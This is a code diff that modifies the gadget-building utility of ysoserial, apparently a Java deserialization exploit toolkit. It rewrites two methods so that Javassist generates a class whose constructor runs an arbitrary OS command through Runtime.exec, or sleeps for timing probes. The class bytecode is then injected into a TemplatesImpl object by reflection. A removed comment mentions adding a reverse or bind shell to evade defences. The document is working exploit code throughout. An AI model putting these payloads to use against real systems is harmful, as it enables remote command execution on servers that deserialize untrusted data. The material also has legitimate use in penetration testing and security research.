@@ -4,11 +4,7 @@ package ysoserial.payloads.util;
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
 import java.io.Serializable;
-import java.lang.reflect.Array;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.InvocationTargetException;
-import java.lang.reflect.Proxy;
+import java.lang.reflect.*;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -24,6 +20,7 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import javassist.CtConstructor;
 
 
 /*
@@ -115,66 +112,58 @@ public class Gadgets {
 
     public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
             throws Exception {
-        final T templates = tplClass.newInstance();
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        ClassPool classPool = ClassPool.getDefault();
+        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+        CtClass clazz = classPool.makeClass("1");
 
-        // use template gadget class
-        ClassPool pool = ClassPool.getDefault();
-        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
-        pool.insertClassPath(new ClassClassPath(abstTranslet));
-        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
-        // run command in static initializer
-        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
+        CtConstructor ctConstructor = new CtConstructor(new CtClass[] {}, clazz);
+        ctConstructor.setBody("java.lang.Runtime.getRuntime().exec(\"" +
             command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
-            "\");";
-        clazz.makeClassInitializer().insertAfter(cmd);
-        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
-        clazz.setName("ysoserial.Pwner" + System.nanoTime());
-        CtClass superC = pool.get(abstTranslet.getName());
+            "\");");
+        clazz.addConstructor(ctConstructor);
+//        String string = "java.lang.Runtime.getRuntime().exec(\"" +
+//            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
+//            "\");";
+//        clazz.makeClassInitializer().insertAfter(string);
+
+        CtClass superC = classPool.get(AbstractTranslet.class.getName());
         clazz.setSuperclass(superC);
-
         final byte[] classBytes = clazz.toBytecode();
-
-        // inject class bytes into instance
-        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
-            classBytes, ClassFiles.classAsBytes(Foo.class)
-        });
-
-        // required to make TemplatesImpl happy
-        Reflections.setFieldValue(templates, "_name", "Pwnr");
-        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
-        return templates;
+        Field bcField = TemplatesImpl.class.getDeclaredField("_bytecodes");
+        bcField.setAccessible(true);
+        bcField.set(templates, new byte[][] {classBytes});
+        Field nameField = TemplatesImpl.class.getDeclaredField("_name");
+        nameField.setAccessible(true);
+        nameField.set(templates, "a");
+        clazz.writeFile();
+        return (T) templates;
     }
 
     public static <T> T createTemplatesImplTime ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
         throws Exception {
-        final T templates = tplClass.newInstance();
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        ClassPool classPool = ClassPool.getDefault();
+        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+        CtClass clazz = classPool.makeClass("1");
 
-        // use template gadget class
-        ClassPool pool = ClassPool.getDefault();
-        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
-        pool.insertClassPath(new ClassClassPath(abstTranslet));
-        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
-        // run command in static initializer
-        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-        String cmd = "Thread.currentThread().sleep(" + command + "L);";
-        clazz.makeClassInitializer().insertAfter(cmd);
-        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
-        clazz.setName("ysoserial.Pwner" + System.nanoTime());
-        CtClass superC = pool.get(abstTranslet.getName());
+        CtConstructor ctConstructor = new CtConstructor(new CtClass[] {}, clazz);
+        ctConstructor.setBody("Thread.currentThread().sleep(" + command + "L);");
+        clazz.addConstructor(ctConstructor);
+//        String string = "Thread.currentThread().sleep(" + command + "L);";
+//        clazz.makeClassInitializer().insertAfter(string);
+
+        CtClass superC = classPool.get(AbstractTranslet.class.getName());
         clazz.setSuperclass(superC);
-
         final byte[] classBytes = clazz.toBytecode();
-
-        // inject class bytes into instance
-        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
-            classBytes, ClassFiles.classAsBytes(Foo.class)
-        });
-
-        // required to make TemplatesImpl happy
-        Reflections.setFieldValue(templates, "_name", "Pwnr");
-        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
-        return templates;
+        Field bcField = TemplatesImpl.class.getDeclaredField("_bytecodes");
+        bcField.setAccessible(true);
+        bcField.set(templates, new byte[][] {classBytes});
+        Field nameField = TemplatesImpl.class.getDeclaredField("_name");
+        nameField.setAccessible(true);
+        nameField.set(templates, "a");
+        clazz.writeFile();
+        return (T) templates;
     }
 
     public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
